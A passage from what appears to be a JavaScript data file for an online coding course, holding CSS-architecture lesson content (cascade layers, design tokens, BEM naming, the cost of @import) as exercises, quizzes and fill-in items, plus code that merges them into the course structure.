      a: "A single class such as `.card__title`. The original scores 1,1,3 and can only be overridden by something worse; a single class scores 0,1,0 and is easy to beat when you need to." },
    { q: "Why is any consistent naming convention better than an inconsistent good one?",
      a: "The value is predictability — knowing where a class belongs and being able to find every rule about a component. A convention nobody follows provides none of that, however elegant it is on paper." },
    { q: "Why avoid `@import` in production?",
      a: "Each file is discovered only after the one importing it has been parsed, so imports serialise into a chain of round trips and delay first paint. Bundle them into one file, or keep one file with clear section banners." },
    { q: "Write the opening of `static/css/style.css` for your Flask app: layers, tokens, and the reset.",
      a: "Then link it from `base.html` with `url_for` — which closes the loop back to lesson 09, and gives you a real stylesheet to grow.",
      code: ['css', `@layer reset, tokens, base, layout, components, utilities;

@layer reset {
  *, *::before, *::after { box-sizing: border-box; }
  body, h1, h2, h3, p, ul { margin: 0; }
  img { display: block; max-width: 100%; height: auto; }
}

@layer tokens {
  :root {
    --bg: #EDF0EE; --ink: #14201E; --accent: #0E7C70;
    --line: #D2D9D6; --radius: 6px;
    --space-2: .5rem; --space-3: 1rem; --space-4: 1.5rem;
  }
}

@layer base {
  body {
    background: var(--bg); color: var(--ink);
    font-family: system-ui, sans-serif;
    line-height: 1.6;
  }
}`] }
  ],
  quiz: [
    { q: "Why declare @layer order at the top of the file?",
      opts: ["Performance", "Layer order decides what wins, before specificity is considered", "It is required", "For imports"], correct: 1,
      why: "Utilities then beat components without needing higher specificity or !important." },
    { q: "What is the real value of BEM?",
      opts: ["The underscores", "Every class states which component it belongs to", "Shorter names", "Faster CSS"], correct: 1,
      why: "Any consistent convention delivers this; the punctuation is arbitrary." },
    { q: "Why avoid IDs in a stylesheet?",
      opts: ["They are deprecated", "1,0,0 specificity is nearly impossible to override cleanly", "They are slow", "They cannot be reused"], correct: 1,
      why: "Keep them for JavaScript hooks and anchors." },
    { q: "What is the cost of @import in production?",
      opts: ["None", "A serial round trip per file, delaying first paint", "It breaks layers", "Larger files"], correct: 1,
      why: "Each import is found only after the previous file is parsed." }
  ],
  fill: [
    { prompt: "Declare the cascade order once.", lang: 'css',
      code: '___ reset, tokens, base, components, utilities;', opts: ["@order", "@layer", "@import", "@use"], correct: 1,
      why: "Later layers win regardless of specificity." },
    { prompt: "Put tokens where everything inherits them.", lang: 'css',
      code: '___ { --accent: #0E7C70; }', opts: ["body", ":root", "*", "html body"], correct: 1,
      why: ":root is the html element and the conventional home for tokens." },
    { prompt: "Name a component's part.", lang: 'css',
      code: '.card___title { }', opts: ["-", "__", "--", "."], correct: 1,
      why: "BEM: __ for an element, -- for a modifier." }
  ]
};

Object.entries(LESSON_CONTENT_2).forEach(([key, content]) => {
  const [track, idx] = key.split(':');
  const lesson = COURSE[track] && COURSE[track].lessons[+idx];
  if (!lesson) return;
  lesson.blocks = content.blocks;
  lesson.ex = content.ex;
  lesson.quiz = content.quiz;
  lesson.fill = content.fill;
  delete lesson.plan;
  delete lesson.covers;
});

Object.entries(ENHANCE).forEach(([key, extra]) => {
  const [track, idx] = key.split(':');
  const lesson = COURSE[track] && COURSE[track].lessons[+idx];
  if (lesson && lesson.blocks) lesson.blocks = lesson.blocks.concat(extra);
});

/*__DATA__*/


